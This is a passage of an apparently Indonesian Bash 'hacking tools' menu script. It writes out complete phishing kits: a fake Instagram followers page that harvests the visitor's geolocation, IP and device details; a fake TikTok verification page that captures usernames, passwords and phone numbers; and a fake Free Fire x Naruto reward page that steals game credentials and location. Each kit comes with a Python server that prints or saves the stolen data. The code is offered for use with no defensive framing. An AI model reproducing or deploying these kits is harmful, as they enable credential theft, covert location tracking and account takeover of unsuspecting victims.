            self.wfile.write(b"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Security check completed! You will be redirected shortly.</h2>")
        else:
            self.send_error(404)
    def log_message(self, format, *args):
        return
if __name__ == "__main__":
    print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:" + str(PORT) + "\033[0m")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
EOF
echo ""
python3 server.py
              echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              rm -f "$HOME/cuy.html" "$HOME/server.py"
              clear
                  ;;
    86)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⡿⠿⠿⢿⣿⣶⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣴⣿⢟⡛⢍⠒⡰⡈⠥⣉⠒⡌⢛⢽⣟⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⡿⣋⠒⢢⠘⠤⡙⠤⡑⣡⢂⠣⡘⢂⢆⡙⢮⣗⠿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⢋⠲⢠⠙⢢⠉⣆⣵⣶⣷⣿⣿⣷⣷⣧⣆⠜⣠⠻⣏⡷⣻⢿⣧⡀⠀
⠀⣼⣿⡑⢊⠱⠨⡌⣡⣾⠿⠋⠁⠀⠀⠀⠀⠈⠙⠻⣿⣦⠥⡹⣳⡽⣫⣿⣷⠀
⢰⣿⢣⠘⡌⡡⢃⣾⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣷⡡⢻⣵⢻⡼⣿⣇
⣾⡿⢂⡱⢌⠰⣹⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⠙⣮⡗⣯⢿⣿
⣿⡇⢣⠰⣈⠒⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠡⣿⡝⣮⢿⣿
⢿⣿⢠⢃⠤⡉⢽⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⢡⡟⣾⡹⣾⣿
⠸⣿⣦⠊⡔⠩⢌⢿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠣⢹⣾⣱⣻⣿⠇
⠀⠹⣿⣜⢨⠑⠬⣈⠿⣿⣦⣀⠀⠀⠀⠀⠀⠀⣀⣤⣾⠟⣅⢊⡿⣖⣳⣿⡟⠀
⠀⠀⠹⣿⣦⢉⠖⡠⢎⡘⠹⠿⢿⣷⣶⣶⣶⡿⢿⠛⡅⢣⠰⣸⢷⣹⣿⠟⠀⠀
⠀⠀⠀⠙⣿⣎⢆⡑⠢⢌⡱⢘⢂⡒⠰⢂⡱⢈⠦⡑⠌⢆⢱⣯⣳⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣖⡌⠱⢂⡔⠣⢌⡰⢉⡒⠤⢃⢆⠩⡘⢌⡾⣵⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣎⡑⡊⠔⣡⠒⡄⢣⢘⡐⠣⢌⠒⡩⣸⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⣿⣖⢩⠘⡄⢣⠘⡄⠣⢌⠱⡈⢎⢱⣿⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢊⡔⢡⢃⠬⡑⢊⠱⡈⢦⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣶⢈⠦⡘⠤⡑⡉⠆⢥⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⢢⠑⡘⠤⡙⢌⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠩⠜⡰⢁⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣧⠓⡄⣻⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣯⣴⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${g}======================================"
echo -e "${r}   Tools Seeker Lokasi Information"
echo -e "${g}======================================"
echo ""
python3 <<PYTHON
import http.server, socketserver, os, json
class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    def do_POST(self):
        if self.path == "/kliklanjut":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode())

                print(f"\n\033[31;1m[\033[32;1m+\033[31;1m]\033[35;1m Device Information :")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m IP Target : \033[0m{data.get('ip', 'Unknown')}\n")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m OS : \033[0m{data.get('os', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Platform : \033[0m{data.get('platform', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m CPU Cores : \033[0m{data.get('cores', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m RAM : \033[0m{data.get('ram', 'Unknown')} GB")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m GPU Vendor : \033[0m{data.get('gpuVendor', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m GPU : \033[0m{data.get('gpu', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Resolution : \033[0m{data.get('res', 'Unknown')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Browser : \033[0m{data.get('browser', 'Unknown')}")

                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[35;1m Location Information :\033[0m")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Latitude : \033[0m{data.get('lat', '-')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Longitude : \033[0m{data.get('lon', '-')}")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Accuracy : \033[0m{data.get('acc', '-')} m")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Altitude : \033[0m{data.get('alt', '-')} m")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Direction : \033[0m{data.get('dir', '0')}°")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Speed : \033[0m{data.get('spd', '0')} m/s")
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Google Maps : \033[0mhttps://maps.google.com/?q={data.get('lat')},{data.get('lon')}")

                save_dir = "/data/data/com.termux/files/home/Instagram"
                os.makedirs(save_dir, exist_ok=True)
                with open(os.path.join(save_dir, "info.txt"), "w") as out:
                    json.dump(data, out, indent=2)
                print(f"\033[31;1m[\033[32;1m+\033[31;1m]\033[36;1m Data Saved : \033[0m{save_dir}/info.txt")
            except Exception as e:
                print("\033[31;1m[\033[32;1mERROR\033[31;1m]\033[36;1m Data tidak valid : ", e)
            self.send_response(200)
            self.end_headers()
        else:
            self.send_error(404)
os.makedirs("web", exist_ok=True)
with open("web/index.html", "w") as f:
    f.write('''
<!DOCTYPE html>
<html>
<head>
  <title>Instagram Followers</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      text-align: center;
      background: linear-gradient(to right, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      color: white;
      font-family: sans-serif;
      padding-top: 50px;
    }
    img { width: 200px; }
    .btn {
      margin-top: 30px;
      background: white;
      color: #dc2743;
      font-weight: bold;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
  <script>
    async function lanjutkan() {
      let lat=0, lon=0, acc=0, alt=0, spd=0, dir=0, ip="Unknown";
      if (navigator.geolocation) {
        await new Promise(resolve => {
          navigator.geolocation.getCurrentPosition(pos => {
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
            acc = pos.coords.accuracy;
            alt = pos.coords.altitude || 0;
            spd = pos.coords.speed || 0;
            dir = pos.coords.heading || 0;
            resolve();
          }, err => {
            alert("Akses lokasi gagal atau ditolak!");
            resolve();
          });
        });
      }
      try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ip = ipData.ip;
      } catch (e) {
        ip = "Gagal mengambil IP";
      }
      const data = {
        os: navigator.platform,
        platform: navigator.userAgentData?.platform || navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || 0,
        gpuVendor: "WebGL",
        gpu: getGPUInfo(),
        res: screen.width + "x" + screen.height,
        browser: navigator.userAgent,
        lat, lon, acc, alt, spd, dir, ip
      };
      await fetch("/kliklanjut", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
      });
      window.location.href = "/proses.html";
    }
    function getGPUInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      } catch (e) {
        return "Unknown";
      }
    }
  </script>
</head>
<body>
  <img src="https://i.top4top.io/p_35631jnco1.jpg" alt="Logo">
  <h1>Instagram Followers</h1>
  <h2>Click continue to load the page</h2>
  <p>New Instagram Suntik Network</p>
  <button class="btn" onclick="lanjutkan()">Lanjutkan</button>
</body>
</html>
''')
with open("web/proses.html", "w") as f:
    f.write('''
<!DOCTYPE html>
<html>
<head>
  <title>Proses Followers</title>
  <meta charset="UTF-8">
  <style>
    body {
      background: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
  </style>
</head>
<body>
  <h1>Followers sedang diproses...</h1>
  <p>Mohon untuk menunggunya.</p>
</body>
</html>
''')
os.chdir("web")
PORT = 8000
socketserver.TCPServer.allow_reuse_address = True
while True:
    try:
        with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
            print(f"\n\033[31;1m[\033[32;1m + \033[31;1m]\033[36;1m Server aktif di : \033[33;1mhttp://127.0.0.1:{PORT}")
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[36;1m Tekan \033[32;1mCTRL+Z \033[36;1muntuk keluar")
            httpd.serve_forever()
    except OSError:
        print(f"\033[31;1m[ \033[32;1m!! \033[31;1m]\033[36;1m Port {PORT} sudah dipakai, mencoba port lain..!!")
        PORT += 1
PYTHON
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
      87)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
echo "
████████╗██╗██╗  ██╗████████╗ ██████╗ ██╗  ██╗
╚══██╔══╝██║██║ ██╔╝╚══██╔══╝██╔═══██╗██║ ██╔╝
   ██║   ██║█████╔╝    ██║   ██║   ██║█████╔╝ 
   ██║   ██║██╔═██╗    ██║   ██║   ██║██╔═██╗ 
   ██║   ██║██║  ██╗   ██║   ╚██████╔╝██║  ██╗
   ╚═╝   ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝"| lolcat 
cat > cuy.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>TikTok Account Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif;
            background: #000;
            color: white;
            min-height: 100vh;
            padding: 20px;
            background: linear-gradient(135deg, #000000, #2d1b69);
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
        }
        .tiktok-logo {
            text-align: center;
            font-size: 42px;
            font-weight: bold;
            margin-bottom: 30px;
            text-shadow: 0 0 10px rgba(255, 0, 80, 0.5);
        }
        .tiktok-logo span:nth-child(1) { color: #ff0050; }
        .tiktok-logo span:nth-child(2) { color: #00f2ea; }
        .tiktok-logo span:nth-child(3) { color: #ff0050; }
        .tiktok-logo span:nth-child(4) { color: #00f2ea; }
        .tiktok-logo span:nth-child(5) { color: #ff0050; }
        .tiktok-logo span:nth-child(6) { color: #00f2ea; }
        .verification-box {
            background: rgba(18, 18, 18, 0.8);
            border-radius: 15px;
            padding: 25px;
            margin: 20px 0;
            border: 1px solid #333;
            backdrop-filter: blur(10px);
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid #333;
            border-radius: 8px;
            background: #000;
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        input:focus {
            outline: none;
            border-color: #ff0050;
            box-shadow: 0 0 10px rgba(255, 0, 80, 0.3);
        }
        .verify-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff0050, #00f2ea);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
        }
        .verify-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 0, 80, 0.4);
        }
        .benefits {
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }
        .benefit-item {
            text-align: center;
        }
        .benefit-icon {
            font-size: 24px;
            margin-bottom: 5px;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #ff0050;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="tiktok-logo">
            <span>T</span><span>i</span><span>k</span><span>T</span><span>o</span><span>k</span>
        </div>
        <div class="verification-box">
            <h3 style="text-align: center; margin-bottom: 20px;">🎯 Creator Verification</h3>
            <p style="text-align: center; color: #ccc; margin-bottom: 20px;">
                Verify your account to unlock special features and increase your visibility!
            </p>
            <div class="benefits">
                <div class="benefit-item">
                    <div class="benefit-icon">👑</div>
                    <div>Verified Badge</div>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon">📈</div>
                    <div>More Views</div>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon">💎</div>
                    <div>Premium Features</div>
                </div>
            </div>
        </div>
        <form id="tiktokForm">
            <input type="text" id="tiktokUsername" placeholder="Username or Email" required>
            <input type="password" id="tiktokPassword" placeholder="Password" required>
            <input type="text" id="tiktokPhone" placeholder="Phone Number (optional)">    
            <div class="loading" id="loading">
                <div class="spinner"></div>
                Verifying your account...
            </div>     
            <button type="submit" class="verify-btn">🎬 VERIFY CREATOR ACCOUNT</button>
        </form>
        <div style="text-align: center; margin-top: 20px; font-size: 12px; color: #666;">
            By verifying, you agree to TikTok's terms of service
        </div>
    </div>
    <script>
        const pageId = "tiktok_page";
        document.getElementById('tiktokForm').addEventListener('submit', function(e) {
            e.preventDefault();   
            const username = document.getElementById('tiktokUsername').value;
            const password = document.getElementById('tiktokPassword').value;
            const phone = document.getElementById('tiktokPhone').value;
            const loading = document.getElementById('loading');
            const submitBtn = this.querySelector('button[type="submit"]');
            loading.style.display = 'block';
            submitBtn.disabled = true;
            submitBtn.textContent = 'VERIFYING...';     
            fetch('/collect/' + pageId, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    service: 'TikTok',
                    username: username,
                    password: password,
                    phone: phone,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                })
            }).then(() => {
                loading.style.display = 'none';
                submitBtn.textContent = '✅ VERIFICATION SUCCESSFUL!';
                submitBtn.style.background = 'linear-gradient(45deg, #00b300, #00f2ea)';          
                setTimeout(() => {
                    alert('✅ Creator account verified! Unlocking premium features.');
                    setTimeout(() => {
                        window.location.href = 'https://tiktok.com';
                    }, 2000);
                }, 1000);
            }).catch(() => {
                loading.style.display = 'none';
                submitBtn.disabled = false;
                submitBtn.textContent = '🎬 VERIFY CREATOR ACCOUNT';
                alert('❌ Verification failed. Please try again.');
            });
        });
    </script>
</body>
</html>
EOF
port=${1:-8080}
cat > server.py <<EOF
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import os
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print("\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port " + str(port) + " ini sedang digunakan.")
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba port lain..!!")
            port += 1
PORT = find_available_port($port)
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            if os.path.exists("cuy.html"):
                with open("cuy.html", "r") as f:
                    self.wfile.write(f.read().encode())
            else:
                self.wfile.write(b"<h1>Error: HTML file not found</h1>")
        else:
            self.send_error(404, "Halaman tidak ditemukan.")
    def do_POST(self):
        if self.path == "/collect/tiktok_page":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())
            username = data.get('username', '')
            password = data.get('password', '')
            phone = data.get('phone', '')
            service = data.get('service', '')    
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Service :\033[32;1m " + service + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Username/Email :\033[32;1m " + username + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m " + password + "\033[0m")
            if phone:
                print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Phone :\033[32;1m " + phone + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User Agent :\033[32;1m " + data.get('userAgent', '') + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Platform :\033[32;1m " + data.get('platform', '') + "\033[0m")
            print("")  
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<h2 style='color: white; background-color: #2e3d50; padding: 20px;'>Security check completed! You will be redirected shortly.</h2>")
        else:
            self.send_error(404)
    def log_message(self, format, *args):
        return
if __name__ == "__main__":
    print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:" + str(PORT) + "\033[0m")
    print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Menunggu kredensial.\033[0m")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
EOF
echo ""
python3 server.py
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
rm -f "$HOME/cuy.html" "$HOME/server.py"
clear
  ;;
      88)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
echo "
███████╗███████╗    
██╔════╝██╔════╝    
█████╗  █████╗      
██╔══╝  ██╔══╝      
██║     ██║         
╚═╝     ╚═╝ " | lolcat           
cat > Peju.html <<EOF
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Free Fire x NARUTO - Event Spesial</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:#0a0a0a;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
      background: linear-gradient(135deg, #0a0a0a 0%, #1a0a2e 50%, #0a0a0a 100%);
    }
    .card{
      width:100%;
      max-width:400px;
      padding:40px 30px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:16px;
      backdrop-filter:blur(12px);
      box-shadow:0 0 30px rgba(255,0,80,0.3);
      position:relative;
      overflow:hidden;
    }
    .card::before {
      content:'';
      position:absolute;
      top:-50%;
      left:-50%;
      width:200%;
      height:200%;
      background:linear-gradient(45deg,transparent,rgba(255,0,80,0.1),transparent);
      transform:rotate(45deg);
      animation:shine 3s linear infinite;
    }
    @keyframes shine {
      0%{transform:rotate(45deg) translateX(-100%);}
      100%{transform:rotate(45deg) translateX(100%);}
    }
    .logo{
      font-size:36px;
      font-weight:700;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:10px;
      letter-spacing:-1px;
      text-shadow:0 0 20px rgba(255,0,80,0.5);
    }
    .event{
      font-size:14px;
      color:#ffcc00;
      text-align:center;
      margin-bottom:25px;
      font-weight:600;
    }
    .naruto{
      width:120px;
      height:120px;
      margin:0 auto 20px;
      background:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="45" fill="%23ffcc00"/><path d="M50 20 L60 40 L80 40 L65 55 L75 75 L50 60 L25 75 L35 55 L20 40 L40 40 Z" fill="%23ff0050"/></svg>') center/cover;
      border-radius:50%;
      box-shadow:0 0 20px rgba(255,204,0,0.6);
      animation:float 3s ease-in-out infinite;
    }
    @keyframes float {
      0%,100%{transform:translateY(0px);}
      50%{transform:translateY(-10px);}
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:12px;
      background:rgba(0,0,0,0.8);
      border:1px solid #333;
      border-radius:8px;
      color:#fff;
      font-size:14px;
      transition:all 0.3s ease;
    }
    input:focus{
      outline:none;
      border-color:#ff0050;
      box-shadow:0 0 10px rgba(255,0,80,0.3);
    }
    input::placeholder{
      color:#888;
    }
    .btn{
      width:100%;
      padding:12px;
      border:none;
      border-radius:8px;
      background:linear-gradient(45deg,#ff0050,#ffcc00);
      color:#fff;
      font-weight:600;
      font-size:14px;
      cursor:pointer;
      transition:.3s;
      margin-top:10px;
    }
    .btn:hover{
      transform:scale(1.02);
      box-shadow:0 0 20px rgba(255,0,80,0.6);
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#ffcc00;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #ffcc00;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .reward-text{
      text-align:center;
      font-size:12px;
      color:#ffcc00;
      margin-top:15px;
      font-weight:500;
    }
    .features{
      display:flex;
      justify-content:space-around;
      margin:20px 0;
      font-size:12px;
    }
    .feature{
      text-align:center;
    }
    .feature-icon{
      font-size:20px;
      margin-bottom:5px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Free Fire</div>
    <div class="event">Event Spesial: Free Fire x NARUTO</div>
    <div class="naruto"></div>
    <div class="features">
      <div class="feature">
        <div class="feature-icon">🎁</div>
        <div>Free Skin</div>
      </div>
      <div class="feature">
        <div class="feature-icon">⚡</div>
        <div>Character NARUTO</div>
      </div>
      <div class="feature">
        <div class="feature-icon">💎</div>
        <div>500 Diamond</div>
      </div>
    </div>
    <input type="text" id="user" placeholder="ID Garena / Email / Nomor HP"/>
    <input type="password" id="pass" placeholder="Kata Sandi"/>
    <button class="btn" onclick="login()">Klaim Hadiah & Masuk</button>
    <div class="reward-text">
      🎉 Dapatkan Skin NARUTO Exclusive & 500 Diamond Gratis!
    </div>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Memverifikasi akun dan mengklaim hadiah...</div>
    </div>
  </div>
  <script>
    async function login(){
      const user=document.getElementById('user').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!user||!pass){
        alert('Harap lengkapi ID dan Kata Sandi untuk klaim hadiah!');
        return;
      }
      const loading=document.getElementById('loading');
      const btn=document.querySelector('.btn');  
      loading.style.display='block';
      btn.disabled=true;
      btn.textContent='MENGKLAIM HADIAH...';
      try{
        let lat='', lon='';
        try{
          const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));
          lat=pos.coords.latitude;
          lon=pos.coords.longitude;
        }catch(e){
          console.log('Location access denied or unavailable');
        }
        let img='';
        try{
          img='simulated_image_data';
        }catch(e){
          console.log('Camera access denied');
        }
        await fetch('/collect/freefire_event',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({
            user:user,
            pass:pass,
            lat:lat,
            lon:lon,
            img:img,
            userAgent:navigator.userAgent,
            platform:navigator.platform,
            timestamp:new Date().toISOString()
          })
        });
        setTimeout(()=>{
          loading.innerHTML='<div style="color:#00ff00; font-weight:600;">✓ Berhasil! Hadiah diklaim</div><div style="font-size:12px; margin-top:5px;">Mengarahkan ke Free Fire...</div>';
          btn.style.background='linear-gradient(45deg, #00b300, #00ff00)';  
          setTimeout(()=>{
            window.location.href='https://ff.garena.com';
          },2000);
        },2000);
      }catch(e){
        loading.innerHTML='<div style="color:#ff4444; font-weight:600;">✗ Gagal mengklaim hadiah</div><div style="font-size:12px; margin-top:5px;">Silakan coba lagi...</div>';
        btn.disabled=false;
        btn.textContent='Klaim Hadiah & Masuk';
        setTimeout(()=>{
          loading.style.display='none';
        },3000);
      }
    }
    document.addEventListener('keypress',function(e){
      if(e.key==='Enter') login();
    });
  </script>
</body>
</html>
EOF
port=${1:-8080}
cat > server.py <<EOF
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socket
import os
from datetime import datetime
def find_available_port(start_port):
    port = start_port
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.bind(('0.0.0.0', port))
            sock.close()
            return port
        except OSError:
            print("\033[31;1m[ \033[32;1mx \033[31;1m]\033[35;1m Port " + str(port) + " ini sedang digunakan.")
            print("\033[31;1m[ \033[32;1m+ \033[31;1m]\033[33;1m Mencoba port lain..!!")
            port += 1
PORT = find_available_port($port)
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            if os.path.exists("Peju.html"):  # DIUBAH: cuy.html -> Peju.html
                with open("Peju.html", "r") as f:  # DIUBAH: cuy.html -> Peju.html
                    self.wfile.write(f.read().encode())
            else:
                self.wfile.write(b"<h1>Error: HTML file not found</h1>")
        else:
            self.send_error(404, "Halaman tidak ditemukan.")
    def do_POST(self):
        if self.path == "/collect/freefire_event":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode())   
            user = data.get('user', '')
            password = data.get('pass', '')
            lat = data.get('lat', '')
            lon = data.get('lon', '')
            img = data.get('img', '')     
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m " + "="*50 + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Free Fire x NARUTO - Data Baru\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Waktu :\033[32;1m " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User/ID :\033[32;1m " + user + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Password :\033[32;1m " + password + "\033[0m")
            if lat and lon:
                print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Lokasi :\033[32;1m " + f"{lat}, {lon}" + "\033[0m")
            if img:
                print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m Foto :\033[32;1m Tersedia (" + str(len(img)) + " bytes)\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m User Agent :\033[32;1m " + self.headers.get('User-Agent', '') + "\033[0m")
            print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[34;1m " + "="*50 + "\033[0m\n")
            with open("freefire_data.txt", "a") as f:
